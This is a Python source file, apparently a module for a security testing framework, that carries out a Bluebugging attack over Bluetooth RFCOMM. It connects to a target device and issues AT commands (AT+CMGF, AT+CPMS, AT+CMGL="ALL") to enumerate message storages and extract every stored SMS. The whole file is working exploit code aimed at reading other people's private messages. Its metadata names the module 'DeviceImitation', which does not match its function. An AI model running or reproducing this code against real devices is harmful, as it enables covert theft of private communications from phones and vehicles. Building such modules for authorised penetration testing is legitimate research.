from autosec.core.autosec_module import AutosecModule, AutosecModuleInformation
from autosec.core.ressources.bluetooth import BluetoothService, AT_SMS
from .bt_at_commands import *
from typing import List
import bluetooth

from autosec.core.ressources.base import AutosecRessource

def load_module():
    '''
    Method to provide the module to the framework
    '''
    return [BluebuggingService()]

class BluebuggingService(AutosecModule):
    '''
    Class to use the Bluebugging exploit on a Bluetooth service
    '''

    def __init__(self):
        super().__init__()

    def get_info(self):
        return AutosecModuleInformation(
            name="DeviceImitation",
            description = "Module to use the Bluebugging exploit on a target service",
            dependencies = ["PyBluez"],
            tags = ["Bluetooth", "RFCOMM"]
        )
    
    def get_produced_outputs(self) -> List[AT_SMS]:
        return [AT_SMS]
    

    def get_required_ressources(self) -> List[AutosecRessource]:
        return [BluetoothService]
    
    
    def run(self,inputs: List[AutosecRessource]) -> List[AT_SMS]:
        service = self.get_ressource(inputs, BluetoothService)
        if not service.get_protocol() == "RFCOMM" and not service.get_protocol() == "None":
            print("wrong service was given")
            exit()
        device = service.get_device()
        bd_addr  = service.get_device().get_bd_addr()
        port = service.get_port()

        messages = {}
        
        try:
            # Create a Bluetooth socket using RFCOMM
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                
            # Connect to the target device on the specified port
            print(f"Connecting to {bd_addr} on port {port}...")
            sock.connect((bd_addr, port))
            print("Connected.")

            command1 =  "AT+CMGF=1" # set mode to text mode

            response_str = send_recv_at_cmd(sock, command1)

            if response_str.strip() == "OK":
                print("Device is set to text mode")

            elif response_str.strip() == "ERROR":
                print("Text mode is not supported")
                exit()

            else:
                print(f"Unknown response: Response was {response_str}")
            
            command2 = "AT+CPMS=?" # ask for supported storages
            
            response_str = send_recv_at_cmd(sock, command2)
            
            if response_str.strip().startswith("+CPMS:"):
                memories = parse_storages(response_str)

            elif response_str.strip() == "ERROR":
                print(f"listing storages is not supported")
                exit()
            
            elif response_str.strip().startswith("+CMS ERROR"):
                print(f"An error occured while listing storages, error message: {response_str}")
                exit()
            
            else:
                print(f"Unknown response: Response was {response_str}")

            for mem in memories:
                command3 = f'AT+CPMS="{mem}"' # select storage
                
                response_str = send_recv_at_cmd(sock, command3)

                if response_str.strip().startswith("+CPMS:"):
                    print(f"storage {mem} was selected")
                    command4 = 'AT+CMGL="ALL"' # list all messages

                    response_str = send_recv_at_cmd(sock, command4)

                    if response_str.strip() == "ERROR":
                        print(f"listing all messages for storage {mem} is not supported")

                    elif response_str.strip().startswith("+CMS ERROR:"):
                        print(f"an error occured while listing messages for storage {mem}, error message: {response_str}")
                        
                    elif response_str.strip().startswith("+CMGL:"):
                        messages[mem] = parse_message_list_response(response_str)

                    else:
                        print(f"Unknown response: Response was {response_str}")
                
                elif response_str.strip() == "ERROR":
                    print(f"selecting storage {mem} is not supported")

                elif response_str.strip().startswith("+CMS ERROR"):
                    print(f"an error occured for storage {mem}, error message: {response_str}")
                
                else:
                    print(f"Unknown response: Response was {response_str}")


        except bluetooth.BluetoothError as e:
                print(f"Bluetooth error: {e}")

        finally:
            # Close the socket
            print("Closing connection")
            sock.close()

        messages_list = []
        for storage, value in messages.items():
            for index, info_data in value.items():
                sms = AT_SMS(device, storage, int(index), info_data["info"], info_data["data"])
                messages_list.append(sms)
        
        return messages_list